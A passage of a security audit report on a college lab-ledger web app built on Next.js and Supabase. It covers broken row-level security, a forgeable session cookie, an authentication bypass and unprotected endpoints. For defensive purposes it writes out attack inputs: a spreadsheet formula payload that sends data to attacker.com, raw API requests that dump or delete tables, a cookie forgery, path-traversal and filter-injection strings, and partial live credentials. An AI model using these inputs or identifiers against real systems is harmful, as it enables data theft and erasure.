# MASTER TECHNICAL CODE AUDIT & SECURITY VULNERABILITY ASSESSMENT
## Computer Lab Ledger System (`clg-led-web`)

**Audit Date**: September 3, 2026  
**Target Repository**: `d:\clg-led-web`  
**Application Architecture**: Next.js 15.3.3 (App Router), React 19.1.0, Tailwind CSS 3.4.17, Supabase PostgreSQL, Google Gemini REST API  
**Audit Protocol**: Strict Read-Only Forensic Inspection (Zero Source Code Modifications, Zero External Builds Executed)  
**Deliverable Document**: Publication-Grade Master Audit Report & Remediation Guide  

---

## Table of Contents

1. [Executive Summary & Architectural Overview](#1-executive-summary--architectural-overview)
   - 1.1 Scope, Mandate & Audit Methodology
   - 1.2 Overall System Risk Score & Security Posture
   - 1.3 High-Level System Architecture & Trust Boundaries
   - 1.4 Primary Systemic Discoveries
2. [High-Priority Vulnerability Matrix](#2-high-priority-vulnerability-matrix)
   - 2.1 Consolidated Security & Integrity Risk Registry (SEC-01 to SEC-15)
   - 2.2 Core Code Health & Defect Matrix (OBS-01 to OBS-25)
3. [Threat Model & Deep Security Analysis](#3-threat-model--deep-security-analysis)
   - 3.1 Authentication, Session Integrity & Middleware Bypass
   - 3.2 Database Access Control & Row-Level Security (RLS) Neutralization
   - 3.3 API Protection, Resource Starvation & Gemini Quota Exhaustion
   - 3.4 Secrets Hygiene, Client-Side Leaks & Root Executable Anomaly
   - 3.5 Data Sanitization, Formula Injection (CWE-1236) & PostgREST Injection
4. [Exhaustive File-by-File Technical Code Audit (All 47 Files)](#4-exhaustive-file-by-file-technical-code-audit-all-47-files)
   - 4.1 Root Configuration, Environment & Hygiene (15 Files)
   - 4.2 Application Routes & API Handlers (15 Files)
   - 4.3 UI & Domain Components (4 Files)
   - 4.4 Utility Libraries & Database Clients (7 Files)
   - 4.5 Public Static Assets & Service Worker (3 Files)
   - 4.6 Database DDL Schemas & RLS Migration Scripts (3 Files)
5. [End-to-End User Flow Health Analysis](#5-end-to-end-user-flow-health-analysis)
   - 5.1 Flow 1: Faculty Authentication & Session Lifecycle
   - 5.2 Flow 2: OCR Photo Ingestion & The Artificial Roster Matching Flaw
   - 5.3 Flow 3: Session Review Table, Debounce Concurrency & Silent Deletion Bug
   - 5.4 Flow 4: Manual Session Creation & Orphaned Records
   - 5.5 Flow 5: Client-Side PDF Generation & Institutional Identity Collision
   - 5.6 Flow 6: Spreadsheet Export, SheetJS Vulnerabilities & Backup Cron Failure
   - 5.7 Flow 7: Administrative Dashboard Analytics & Client-Side Database Flooding
6. [Concrete Remediation Guidelines & Production-Ready Code Patches](#6-concrete-remediation-guidelines--production-ready-code-patches)
   - 6.1 Patch 1: Hardened Supabase Row-Level Security Policies (`supabase/rls-policies.sql`)
   - 6.2 Patch 2: Cryptographic Session Middleware (`middleware.ts`)
   - 6.3 Patch 3: Secure Constant-Time Authentication Route (`app/api/auth/login/route.ts`)
   - 6.4 Patch 4: Authenticated, Rate-Limited OCR Ingestion Pipeline (`app/api/ocr/route.ts`)
   - 6.5 Patch 5: Race-Free Session Review Table Grid (`components/SessionTable.tsx`)
   - 6.6 Patch 6: Atomic Save & Row Deletion Persistence (`app/sessions/[id]/page.tsx`)
   - 6.7 Patch 7: Formula Injection Sanitization for Excel Workbooks (`lib/export-excel.ts`)
   - 6.8 Patch 8: Gemini API Error Recovery & Schema Validation (`lib/gemini.ts`)
   - 6.9 Patch 9: Open Redirect Neutralization (`app/login/page.tsx`)
7. [Verification & Reproduction Commands](#7-verification--reproduction-commands)
   - 7.1 Test 1: Anonymous Supabase Database Read & Delete (RLS Bypass)
   - 7.2 Test 2: Unauthenticated Cookie Forgery Attack
   - 7.3 Test 3: Middleware Path Traversal & Dot Extension Bypass
   - 7.4 Test 4: Excel Formula Injection Proof of Concept
   - 7.5 Test 5: Synthetic Student Roster Verification Proof
   - 7.6 Test 6: Review Table Row Deletion Resurrection Bug
8. [Prioritized Remediation Roadmap](#8-prioritized-remediation-roadmap)
   - Phase 1: Immediate Critical Hotfixes (P0 / 24–48 Hours)
   - Phase 2: Core Data Integrity & API Reliability Fixes (P1 / Days 3–5)
   - Phase 3: Performance Optimization, Scalability & Hygiene (P2 / Week 2)

---

## 1. Executive Summary & Architectural Overview

### 1.1 Scope, Mandate & Audit Methodology

An exhaustive, multi-dimensional technical code audit and threat assessment was executed across the entire repository of the Computer Lab Ledger (`clg-led-web`) application. The ledger is designed to digitize physical handwritten laboratory logs across collegiate engineering/computing departments, digitizing student sign-ins, system allocations, peripheral counts (mouse, keyboard), and faculty sign-offs via Google Gemini OCR and Supabase storage.

In accordance with institutional compliance mandates:
- **Zero-Modification Constraint**: The codebase was inspected in strict read-only mode. No production source files, dependency trees, configuration manifests, or database schemas were modified or built during the audit.
- **Exhaustive Coverage**: 100% of all repository artifacts—comprising 47 distinct files spanning Edge middleware, App Router server handlers, React client components, utility libraries, database migration scripts, root configurations, and binary artifacts—were examined.
- **Multi-Disciplinary Synthesis**: Findings were established by triangulating specification analysis, static application security testing (SAST), state transition modeling, React 19 concurrent lifecycle analysis, and PostgreSQL PostgREST security policy proofs.

### 1.2 Overall System Risk Score & Security Posture

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                      OVERALL SYSTEM RISK SCORE: 9.4 / 10                      ║
║                           SEVERITY: CRITICAL RISK                             ║
║               STATUS: UNFIT FOR INSTITUTIONAL OR PRODUCTION USE               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

The system exhibits severe architectural vulnerabilities that expose institutional data to complete public compromise, remote database erasure, account takeover, denial-of-service, and client-side code execution.

| Risk Category | Score (1–10) | Evaluation | Key Finding |
|---|:---:|:---:|---|
| **Access Control & Authorization** | **10.0** | **Catastrophic** | Supabase RLS is neutralized with `USING (true) WITH CHECK (true)`, granting public `anon` key full read/write/truncate control. |
| **Authentication & Session Security** | **9.8** | **Catastrophic** | Static unsigned cookie `lab_auth_session=authenticated` and middleware dot-path bypass (`.`) allow total authentication circumvention. |
| **Data Integrity & Relational Health** | **9.5** | **Critical** | Deleted review table rows resurrect upon page reload; OCR matching is completely synthetic (`student_id: null, matched: true`). |
| **API Protection & Quota Abuse** | **9.2** | **Critical** | `/api/ocr` has no authentication, rate limits, or payload restrictions, allowing rapid depletion of Google Gemini API quotas. |
| **Input Sanitization & Injection** | **8.8** | **High** | Unescaped student inputs in Excel exports cause Formula Injection (CWE-1236); unescaped search inputs cause PostgREST filter injection. |
| **Repository & Operational Hygiene** | **8.5** | **High** | Rogue 454 KB `powershell.exe` executable in repository root; active secrets and service role keys checked into `.env.local`. |

### 1.3 High-Level System Architecture & Trust Boundaries

The application is structured around a Next.js App Router frontend communicating with two external cloud systems: Supabase (PostgreSQL, Auth, Storage) and Google Gemini (Generative Language API).

```
                      ┌─────────────────────────────────────────────────────────┐
                      │                     PUBLIC INTERNET                     │
                      └────────────────────────────┬────────────────────────────┘
                                                   │
                  ┌────────────────────────────────┴────────────────────────────────┐
                  │                                                                 │
                  ▼                                                                 ▼
      [HTTP to Next.js Application]                                    [Direct PostgREST / Storage]
      https://clg-led-web.vercel.app/                                  https://<ref>.supabase.co/rest/v1/
                  │                                                                 │
                  ▼                                                                 │
         [middleware.ts]                                                            │
    ❌ Flaw: pathname.includes('.')                                                 │
    ❌ Flaw: Cookie == 'authenticated'                                              │
                  │                                                                 │
         ┌────────┴────────┐                                                        │
         ▼                 ▼                                                        │
   [Pages / UI]       [API Routes]                                                  │
   /dashboard         /api/ocr (No Auth, Unbounded) ──► [Google Gemini REST API]    │
   /sessions/[id]     /api/backup (Cron Secret Unset)   (Model Fallback Loop)       │
   /sessions/new      /api/auth/login (admin:admin123)                              │
         │                 │                                                        │
         │ (createBrowserClient)                                                    │
         │ NEXT_PUBLIC_ANON_KEY                                                     │
         └────────┬────────┘                                                        │
                  │                                                                 │
                  ▼                                                                 ▼
       ┌─────────────────────────────────────────────────────────────────────────────────┐
       │                        SUPABASE POSTGRESQL & STORAGE                             │
       │                                                                                 │
       │  ❌ CRITICAL RLS BYPASS:                                                        │
       │     CREATE POLICY ... FOR ALL USING (true) WITH CHECK (true);                   │
       │                                                                                 │
       │  Tables: students, lab_sessions, session_photos, lab_entries                     │
       │  Bucket: session-photos (PUBLIC: backups & student photos directly downloadable)│
       └─────────────────────────────────────────────────────────────────────────────────┘
```

**Trust Boundary Breakdown**:
1. **Client Browser to Next.js Server**: Boundary is breached because `middleware.ts` evaluates an unencrypted, static cookie and contains a path bypass allowing any request containing a period (`.`) to access protected routes without credentials.
2. **Next.js Server to Supabase**: Inverted trust boundary. The developer assumed Next.js middleware guards the database. In reality, the Supabase PostgREST API is exposed directly to the public internet, and the application's browser client uses `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Because RLS policies evaluate to `true` unconditionally, the database is fully accessible from any web client on earth.
3. **Application to Google Gemini**: Unbounded gateway. Unauthenticated requests to `/api/ocr` dispatch heavy base64 payloads to Google's generative AI endpoint without throttling, exposing the institution to financial denial of service.

### 1.4 Primary Systemic Discoveries

1. **The RLS Open-Door Policy**: `supabase/rls-policies.sql` lines 44–47 implement `create policy ... for all using (true) with check (true)`. Any actor with the publicly bundled `NEXT_PUBLIC_SUPABASE_ANON_KEY` can delete or alter every student and session record via simple HTTP requests.
2. **The Synthetic Matching Scandal**: `app/api/ocr/route.ts` lines 163–165 hardcodes `student_id: null`, `matched: true`, and `ocr_confidence: 1.0` for 100% of OCR-extracted rows. The system falsely reports to faculty that students were successfully matched against the institutional roster, while the relational link is never created.
3. **The Review Table Deletion Defect**: `app/sessions/[id]/page.tsx` never executes a SQL `DELETE` query. Deleting entries in the table UI removes them from local React state, but upon saving and reloading, the deleted entries are re-fetched from Supabase and reappear. Furthermore, there is zero network auto-save; navigating away permanently drops unsaved changes.
4. **Formula Injection (CWE-1236)**: `lib/export-excel.ts` and `app/api/backup/route.ts` insert raw student names, UCMS codes, and remarks directly into Microsoft Excel worksheets without sanitizing leading `=`, `+`, `-`, or `@` characters.
5. **Rogue Workspace Binary**: An unauthorized 454 KB `powershell.exe` binary is committed in the project root directory, creating a severe binary search path hijack vulnerability on Windows hosting environments.

---

## 2. High-Priority Vulnerability Matrix

### 2.1 Consolidated Security & Integrity Risk Registry (SEC-01 to SEC-15)

The following table summarizes all 15 prioritized security vulnerabilities discovered during the technical audit, ranked by risk severity according to the Common Weakness Scoring System (CWSS) and mapped to OWASP Top 10 (2021) standards.

| Vulnerability ID | Severity | Title / Technical Vector | CWE | OWASP Top 10 | Primary Impacted Files & Lines | CVSS v3.1 Score & Vector |
|---|:---:|---|:---:|:---:|---|:---:|
| **SEC-01** | **CRITICAL** | Database RLS Neutralization via Blanket `USING (true)` Policies | CWE-284<br>CWE-285 | A01:2021<br>Broken Access Control | `supabase/rls-policies.sql:44–47`<br>`lib/supabase.ts:5–9` | **10.0**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **SEC-02** | **CRITICAL** | Zero-Entropy Static Session Cookie Forgery | CWE-330<br>CWE-345 | A07:2021<br>Auth Failures | `app/api/auth/login/route.ts:17–23`<br>`middleware.ts:27–33` | **9.8**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **SEC-03** | **CRITICAL** | Unauthenticated `/api/ocr` Ingestion with Gemini Quota Exhaustion | CWE-306<br>CWE-770 | A04:2021<br>Insecure Design | `app/api/ocr/route.ts:8–58`<br>`lib/gemini.ts:39–65` | **9.1**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| **SEC-04** | **HIGH** | Middleware Route Authorization Bypass via Dot Matching (`.`) | CWE-285<br>CWE-697 | A01:2021<br>Broken Access Control | `middleware.ts:16–25` | **8.6**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| **SEC-05** | **HIGH** | Formula Injection (CSV/Excel Injection) in Export & Backups | CWE-1236 | A03:2021<br>Injection | `lib/export-excel.ts:27–34`<br>`app/api/backup/route.ts:84–91` | **8.6**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| **SEC-06** | **HIGH** | Public Storage Bucket Exposing Complete Attendance Backups | CWE-552<br>CWE-284 | A01:2021<br>Broken Access Control | `supabase/schema.sql:74`<br>`app/api/backup/route.ts:120–135` | **7.5**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **SEC-07** | **HIGH** | Unvalidated MIME Types & Storage Path Traversal in `/api/ocr` | CWE-434<br>CWE-22 | A04:2021<br>Insecure Design | `app/api/ocr/route.ts:125–136` | **7.5**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| **SEC-08** | **HIGH** | Hardcoded Fallback Credentials & Non-Constant-Time Password Check | CWE-798<br>CWE-208 | A07:2021<br>Auth Failures | `app/api/auth/login/route.ts:7–15`<br>`.env.local:13–14` | **7.4**<br>`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **SEC-09** | **HIGH** | Rogue Binary Artifact (`powershell.exe`) in Project Root | CWE-426<br>CWE-506 | A08:2021<br>Integrity Failures | `powershell.exe` (Root) | **7.3**<br>`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` |
| **SEC-10** | **MEDIUM** | PostgREST Boolean Filter Injection in Student Search | CWE-943 | A03:2021<br>Injection | `app/dashboard/page.tsx:268–274` | **6.5**<br>`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **SEC-11** | **MEDIUM** | Open Redirect Vulnerability in Faculty Login Navigation | CWE-601 | A01:2021<br>Broken Access Control | `app/login/page.tsx:12, 43`<br>`middleware.ts:30–32` | **6.1**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **SEC-12** | **MEDIUM** | Missing Content Security Policy (CSP) & Clickjacking Protections | CWE-693<br>CWE-1021 | A05:2021<br>Security Misconfig | `next.config.js`<br>`middleware.ts` | **5.4**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` |
| **SEC-13** | **MEDIUM** | Client Component Dependency on Server Service Role Key Module | CWE-522<br>CWE-668 | A05:2021<br>Security Misconfig | `lib/matching.ts:1, 38, 67`<br>`lib/supabase.ts:13–17` | **5.3**<br>`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **SEC-14** | **LOW** | Vercel Cron Secret Misconfiguration & Timing Discrepancy | CWE-208<br>CWE-306 | A07:2021<br>Auth Failures | `app/api/backup/route.ts:12–17`<br>`.env.local:10` | **3.7**<br>`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N` |
| **SEC-15** | **LOW** | 30-Day Session Lifetime with Permissive Lax SameSite Attribute | CWE-613<br>CWE-1275 | A07:2021<br>Auth Failures | `app/api/auth/login/route.ts:20–22` | **3.1**<br>`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` |

---

### 2.2 Core Code Health & Defect Matrix (OBS-01 to OBS-25)

The table below catalogs all 25 architectural, lifecycle, performance, and maintainability defects uncovered during the codebase audit.

| Observation ID | Category | Severity | Summary of Architectural or Functional Defect | Target File & Lines |
|---|:---:|:---:|---|---|
| **OBS-01** | Maintainability | **Low** | Duplicate conflicting Tailwind configurations (`tailwind.config.js` and `tailwind.config.ts`). | Root directory |
| **OBS-02** | Hygiene | **High** | 454 KB `powershell.exe` binary committed in project root directory. | `powershell.exe` |
| **OBS-03** | Maintainability | **Medium** | Unused dead package `@google/generative-ai` installed in `package.json`. | `package.json:53` |
| **OBS-04** | Security | **Critical** | Static cookie `authenticated` & timing attack in password comparison. | `app/api/auth/login/route.ts:7–24` |
| **OBS-05** | Security | **High** | Middleware route bypass on `pathname.includes('.')`. | `middleware.ts:22` |
| **OBS-06** | Maintainability | **Low** | Dead code and loop overwrite bugs in `lib/supabase-middleware.ts`. | `lib/supabase-middleware.ts:15–23` |
| **OBS-07** | Security | **Medium** | Open redirect vulnerability via unvalidated `redirect` query parameter. | `app/login/page.tsx:12, 43` |
| **OBS-08** | Security | **Critical** | Permissive RLS `USING (true)` exposes full database to browser `anon` key. | `supabase/rls-policies.sql:44–47` |
| **OBS-09** | Feature Health | **Critical** | Fake roster matching hardcodes `student_id: null`, `matched: true`, and `confidence: 1.0`. | `app/api/ocr/route.ts:154–188` |
| **OBS-10** | Robustness | **Medium** | Hallucinated Gemini models (`gemini-3.6-flash`) & unvalidated JSON parsing. | `lib/gemini.ts:39–45, 122–126` |
| **OBS-11** | Resilience | **Critical** | Unauthenticated `/api/ocr` allows DoS and uncontrolled Gemini billing spikes. | `app/api/ocr/route.ts:8–30` |
| **OBS-12** | Feature Health | **High** | False auto-save: `SessionTable` edits only update local state; discarded on refresh. | `components/SessionTable.tsx:45–62` |
| **OBS-13** | Lifecycle | **High** | Debounce timer race condition: cell typing stomps row additions and deletions. | `components/SessionTable.tsx:58–89` |
| **OBS-14** | Feature Health | **Critical** | Review table row deletion never executes SQL `DELETE`; deleted rows resurrect on reload. | `app/sessions/[id]/page.tsx:76–138` |
| **OBS-15** | Data Integrity | **Medium** | Non-atomic parallel updates; failure leaves table in partially updated state. | `app/sessions/[id]/page.tsx:96–112` |
| **OBS-16** | Data Integrity | **Medium** | Non-transactional session creation leaves orphaned ghost sessions on entry insert error. | `app/sessions/new/page.tsx:96–128` |
| **OBS-17** | Performance | **Medium** | DOM memory leak: `URL.createObjectURL` in photo upload is never revoked. | `components/PhotoUpload.tsx:29` |
| **OBS-18** | Security | **High** | Formula injection (CWE-1236) in Excel spreadsheet generation. | `lib/export-excel.ts:27–34` |
| **OBS-19** | Reliability | **Medium** | Duplicate sheet names or illegal characters (`/`, `\`, `*`, `:`) crash backup cron. | `app/api/backup/route.ts:108–109` |
| **OBS-20** | Privacy | **High** | Weekly institutional backup spreadsheet uploaded to public storage bucket. | `app/api/backup/route.ts:120–135` |
| **OBS-21** | UI / Rendering | **Medium** | Single-page PDF overflow clips tables >30 rows; branding header/footer conflict. | `lib/export-pdf.tsx:145–233` |
| **OBS-22** | Performance | **High** | Full database table download of `lab_entries` twice on every dashboard load. | `app/dashboard/page.tsx:111–134` |
| **OBS-23** | Reliability | **Medium** | Unthrottled search input sends concurrent requests with out-of-order race conditions. | `app/dashboard/page.tsx:1034–1037` |
| **OBS-24** | Accuracy | **Low** | Empty database returns 100% signed compliance gauge due to false positive logic. | `app/dashboard/page.tsx:177–183` |
| **OBS-25** | Maintainability | **Medium** | Completely defunct `/roster` redirect route and unrendered `RosterUpload.tsx` component. | `app/roster/page.tsx:1–6` |

---

## 3. Threat Model & Deep Security Analysis

### 3.1 Authentication, Session Integrity & Middleware Bypass

#### 3.1.1 Predictable, Forged Session Cookie (SEC-02)
In `app/api/auth/login/route.ts`, upon verifying credentials, the application executes:
```typescript
response.cookies.set('lab_auth_session', 'authenticated', {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  path: '/',
  maxAge: 60 * 60 * 24 * 30, // 30 days
});
```
In `middleware.ts`, access to protected routes is guarded strictly by:
```typescript
const sessionCookie = request.cookies.get('lab_auth_session')?.value;
if (sessionCookie !== 'authenticated') {
  const loginUrl = new URL('/login', request.url);
  loginUrl.searchParams.set('redirect', pathname);
  return NextResponse.redirect(loginUrl);
}
```
**Vulnerability Mechanics**:
- The session cookie value is literally the ASCII string `'authenticated'`.
- It contains **zero entropy**, no cryptographic signature, no embedded timestamp, and no server-side session identity.
- Any attacker can inject `Cookie: lab_auth_session=authenticated` into their browser storage or HTTP client headers and gain complete faculty access without knowing the administrator username or password.
- Furthermore, logout (`app/api/auth/logout/route.ts`) merely instructs the client to delete the cookie (`maxAge: 0`). Because no server-side invalidation or token blacklist exists, stolen cookies remain permanently valid until browser expiry.

#### 3.1.2 Side-Channel Timing Attack in Authentication (SEC-08)
In `app/api/auth/login/route.ts`:
```typescript
const expectedUser = (process.env.LAB_ADMIN_USERNAME || 'admin').trim();
const expectedPass = (process.env.LAB_ADMIN_PASSWORD || 'admin123').trim();

if (
  username &&
  password &&
  username.trim().toLowerCase() === expectedUser.toLowerCase() &&
  password.trim() === expectedPass
)
```
- JavaScript's strict equality operator (`===`) performs an early-exit byte comparison. It returns `false` on the first non-matching character.
- An attacker can measure nanosecond differences in network response times across large dictionary attacks to determine individual characters of the administrator password (CWE-208).
- If `LAB_ADMIN_USERNAME` or `LAB_ADMIN_PASSWORD` are missing or uninitialized in deployment, the system falls back to default credentials `admin` and `admin123`.

#### 3.1.3 Middleware Dot-Notation Authorization Bypass (SEC-04)
In `middleware.ts`:
```typescript
if (
  pathname.startsWith('/_next') ||
  pathname.startsWith('/favicon') ||
  pathname.startsWith('/logo') ||
  pathname.startsWith('/manifest') ||
  pathname.startsWith('/sw') ||
  pathname.includes('.')
) {
  return NextResponse.next();
}
```
**Vulnerability Mechanics**:
- The condition `pathname.includes('.')` was intended to permit static assets like `.png` or `.ico` to bypass authentication.
- However, this rule evaluates to `true` for **any URL containing a period**.
- Requesting `https://<host>/sessions/.`, `https://<host>/dashboard?v=.`, or `https://<host>/api/ocr?file=.` completely bypasses the middleware route protection. Unauthenticated users are granted direct access to administrative page renders and API handlers.

#### 3.1.4 Open Redirect Exploitation (SEC-11)
In `app/login/page.tsx`:
```typescript
const redirect = searchParams.get('redirect') || '/';
...
router.push(redirect);
```
- The `redirect` query parameter is fed directly to `router.push()` without verifying that it begins with a relative path.
- An attacker can construct phishing links such as `https://college-ledger/login?redirect=https://credential-stealer.edu`. When faculty members log in, they are immediately redirected to the malicious external domain.

---

### 3.2 Database Access Control & Row-Level Security (RLS) Neutralization

#### 3.2.1 Permissive RLS Policies (`USING (true)`) (SEC-01)
In `supabase/rls-policies.sql`:
```sql
alter table students enable row level security;
alter table lab_sessions enable row level security;
alter table session_photos enable row level security;
alter table lab_entries enable row level security;

-- Allow application queries for all 4 tables
create policy "app_access_students" on students for all using (true) with check (true);
create policy "app_access_lab_sessions" on lab_sessions for all using (true) with check (true);
create policy "app_access_session_photos" on session_photos for all using (true) with check (true);
create policy "app_access_lab_entries" on lab_entries for all using (true) with check (true);
```
In `lib/supabase.ts`:
```typescript
export function createBrowserClient() {
  const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
  const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
  return createSupabaseBrowserClient(supabaseUrl, supabaseAnonKey);
}
```
**Vulnerability Mechanics**:
1. Next.js environment variables prefixed with `NEXT_PUBLIC_` are intentionally compiled into client-side JavaScript bundles.
2. The developer mistakenly assumed that Next.js `middleware.ts` would guard the database, as stated in their SQL comment:
   `-- (Next.js middleware.ts strictly gates access behind faculty login)`
3. However, Supabase's PostgREST gateway (`https://<project-ref>.supabase.co/rest/v1/`) is exposed directly to the public internet, completely independent of Next.js.
4. Because the RLS policies grant unconditional permissions (`using (true) with check (true)` for all actions), any anonymous client on the internet holding the public `anon` key can issue raw HTTP commands:
   - `GET /rest/v1/students?select=*` (exfiltrates full student database)
   - `DELETE /rest/v1/lab_sessions` (permanently wipes all lab sessions and cascades to all entries and photos)
   - `PATCH /rest/v1/lab_entries` (modifies historical signatures or hardware allocations)

#### 3.2.2 Public Storage Bucket Exposing Attendance Backups (SEC-06)
In `supabase/schema.sql` line 74, the storage bucket `session-photos` is created with public read permissions:
`insert into storage.buckets (id, name, public) values ('session-photos', 'session-photos', true);`
In `app/api/backup/route.ts` lines 120–135:
```typescript
const filename = `backup-${now.toISOString().split('T')[0]}-week.xlsx`;
const filePath = `backups/${filename}`;
await supabase.storage.from('session-photos').upload(filePath, buffer, ...);
```
- The weekly backup cron writes the entire institutional attendance ledger into an unencrypted `.xlsx` file inside this public bucket.
- Any unauthorized individual can download full institutional spreadsheets containing student names, roll numbers, attendance dates, and faculty signatures simply by enumerating dates:
  `https://<project-ref>.supabase.co/storage/v1/object/public/session-photos/backups/backup-2026-09-01-week.xlsx`

#### 3.2.3 Unrestricted Stored Procedures / RPC Execution
In `supabase/schema-v2.sql`, stored procedures (`flagged_systems`, `student_history`, `section_mismatches`, `photos_due_for_deletion`) are installed in the `public` schema without executing `REVOKE EXECUTE ON FUNCTION ... FROM anon, public;`. Any external client can invoke these functions via `POST /rest/v1/rpc/<function_name>` to discover hardware vulnerability trends or student schedules.

---

### 3.3 API Protection, Resource Starvation & Gemini Quota Abuse

#### 3.3.1 Unauthenticated `/api/ocr` Endpoint & Financial Denial of Service (SEC-03)
In `app/api/ocr/route.ts`:
- Route handler performs no internal verification of session cookies or authentication headers.
- Receives an unbounded array `photos: { base64: string; mimeType: string; pageNumber: number }[]`.
- Fires concurrent requests to Google Gemini via `Promise.all`:
  ```typescript
  const ocrPromises = sortedPhotos.map(async (photo) => {
    const result = await extractLedgerData(photo.base64, photo.mimeType);
    return { result, pageNumber: photo.pageNumber };
  });
  ```
In `lib/gemini.ts`:
```typescript
const FALLBACK_MODELS = [
  'gemini-2.5-flash',
  'gemini-flash-latest',
  'gemini-3.6-flash',
  'gemini-2.5-flash-lite',
  'gemini-2.5-pro',
];
...
for (const modelName of FALLBACK_MODELS) {
  ...
  const timeoutId = setTimeout(() => controller.abort(), 45000);
  const res = await fetch(`https://generativelanguage.googleapis.com/...`);
```
**Attack Vector**:
1. An attacker sends 100 requests to `/api/ocr?f=.` (leveraging the middleware dot bypass) containing five 10MB base64 images per request.
2. The server spins up 500 parallel promises. Each promise iterates through up to 5 models with a 45-second timeout, holding Node.js serverless workers open for up to 225 seconds.
3. This rapidly exhausts the Google Gemini monthly API rate limit (HTTP 429), runs up catastrophic API bills, and exhausts memory buffers on the Next.js runtime (Node.js heap out-of-memory crash).

#### 3.3.2 Path Traversal & Unrestricted File Upload in Storage (SEC-07)
In `app/api/ocr/route.ts` lines 125–136:
```typescript
const photoBuffer = Buffer.from(photo.base64, 'base64');
const ext = photo.mimeType.split('/')[1] || 'jpeg';
const filePath = `${session.id}/page-${photo.pageNumber}.${ext}`;
```
- `photo.mimeType` is accepted directly from the client JSON with no magic byte verification.
- An attacker can supply `mimeType: "image/../../malicious.html"` or negative page numbers, leading to path traversal inside Supabase Storage.
- Uploading files with `contentType: "text/html"` or `image/svg+xml"` to a public bucket enables Stored Cross-Site Scripting (XSS) when administrators view the images in the dashboard.

---

### 3.4 Secrets Hygiene, Client-Side Leaks & Root Executable Anomaly

#### 3.4.1 Active Credentials Checked into Environment Configuration
In `.env.local`:
- `NEXT_PUBLIC_SUPABASE_URL=https://trhyseqzcjrkctwuwrzu.supabase.co`
- `SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOi...` (Superadmin key capable of overriding RLS)
- `GEMINI_API_KEY=AQ.Ab8RN6IAozLdeMpid91...` (Live Google API key)
- `LAB_ADMIN_USERNAME=admin` / `LAB_ADMIN_PASSWORD=admin123`
- `CRON_SECRET=` (Blank, disabling automated backup crons)

If `.env.local` is inadvertently included in repository backups, Docker layers, or staging builds, an attacker acquires uninhibited root access over the entire cloud infrastructure.

#### 3.4.2 Root Binary Anomaly (`powershell.exe`) (SEC-09)
In the repository root directory `d:\clg-led-web\powershell.exe`:
- A 454 KB binary named `powershell.exe` resides directly alongside `package.json`.
- In Windows developer and CI/CD environments, running `powershell -Command ...` from the project root will resolve `.\powershell.exe` prior to `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` due to Windows command resolution search orders.
- This creates an untrusted binary search path vulnerability (CWE-426), presenting a high-severity integrity threat.

---

### 3.5 Data Sanitization, Formula Injection (CWE-1236) & PostgREST Injection

#### 3.5.1 Formula Injection (CSV/Excel Injection) (SEC-05)
In `lib/export-excel.ts` lines 27–34:
```typescript
const dataRows = entries
  .sort((a, b) => (a.sl_no || 0) - (b.sl_no || 0))
  .map((entry) => [
    entry.sl_no || '',
    entry.student?.name || entry.raw_name_ocr || '',
    entry.student?.ucms_no || entry.raw_ucms_ocr || '',
    entry.system_no || '',
    entry.signature_present ? 'Yes' : 'No',
    entry.remarks || '',
  ]);
```
In `app/api/backup/route.ts` lines 84–91:
```typescript
entry.raw_name_ocr || '',
entry.raw_ucms_ocr || '',
entry.system_no || '',
entry.signature_present ? 'Yes' : 'No',
entry.remarks || '',
```
**Vulnerability Mechanics**:
- The application uses `xlsx@^0.18.5` (SheetJS). Raw OCR text and student remarks are written directly into worksheet cells.
- If an entry begins with `=`, `+`, `-`, `@`, `\t`, or `\r` (for example, a student entering `=CMD|' /C calc'!A0` or `=HYPERLINK("https://attacker.com/leak?d="&B3, "Verify")`), Microsoft Excel treats the cell as a dynamic formula.
- When faculty members or lab superintendents download and open the spreadsheet, the formula executes within their desktop operating system, compromising the host machine.

#### 3.5.2 PostgREST Filter Injection (SEC-10)
In `app/dashboard/page.tsx` line 272:
```typescript
const { data } = await supabase
  .from('lab_entries')
  .select('raw_name_ocr, raw_ucms_ocr')
  .or(`raw_name_ocr.ilike.%${query}%,raw_ucms_ocr.ilike.%${query}%`)
  .limit(30);
```
- The user-supplied search string `query` is interpolated directly into the PostgREST boolean expression string without sanitization.
- In PostgREST syntax, commas and closing parentheses structure the filter syntax. An attacker typing `test),id.neq.00000000-0000-0000-0000-000000000000` can escape the intended `ilike` clause and force arbitrary column filters.

---

## 4. Exhaustive File-by-File Technical Code Audit (All 47 Files)

Every single file in the repository was inspected, analyzed, and categorized into one of four health verdicts:
- **Healthy**: Correct implementation, safe lifecycle, no security vulnerabilities.
- **Needs Attention**: Architectural anomalies, redundant code, or optimization deficiencies.
